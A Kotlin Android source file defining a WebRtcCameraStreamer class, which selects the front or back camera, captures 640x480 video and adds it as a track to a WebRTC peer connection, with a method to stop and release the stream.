package com.systemlinker.features.webrtc

import android.content.Context
import org.webrtc.*

class WebRtcCameraStreamer(
    private val context: Context,
    private val webRtcManager: WebRtcManager
) {
    private var videoCapturer: CameraVideoCapturer? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null

    var isStreaming = false
        private set

    fun startStreaming(isFront: Boolean) {
        if (isStreaming) stopStreaming()

        val factory = webRtcManager.getFactory() ?: return
        val eglContext = webRtcManager.getEglBaseContext()

        val enumerator = if (Camera2Enumerator.isSupported(context)) Camera2Enumerator(context) else Camera1Enumerator(true)
        val deviceName = enumerator.deviceNames.firstOrNull {
            if (isFront) enumerator.isFrontFacing(it) else enumerator.isBackFacing(it)
        } ?: enumerator.deviceNames.firstOrNull() ?: return

        videoCapturer = enumerator.createCapturer(deviceName, null)
        surfaceTextureHelper = SurfaceTextureHelper.create("CameraCaptureThread", eglContext)
        videoSource = factory.createVideoSource(false)

        videoCapturer?.initialize(surfaceTextureHelper, context, videoSource?.capturerObserver)
        videoCapturer?.startCapture(640, 480, 30)

        videoTrack = factory.createVideoTrack("CAM_TRACK_ID_${System.currentTimeMillis()}", videoSource)
        webRtcManager.peerConnection?.addTrack(videoTrack)

        isStreaming = true
    }

    fun stopStreaming() {
        if (!isStreaming) return
        isStreaming = false

        try { videoCapturer?.stopCapture() } catch (e: Exception) {}
        videoCapturer?.dispose(); videoCapturer = null
        videoSource?.dispose(); videoSource = null
        surfaceTextureHelper?.dispose(); surfaceTextureHelper = null
        videoTrack?.dispose(); videoTrack = null
    }
}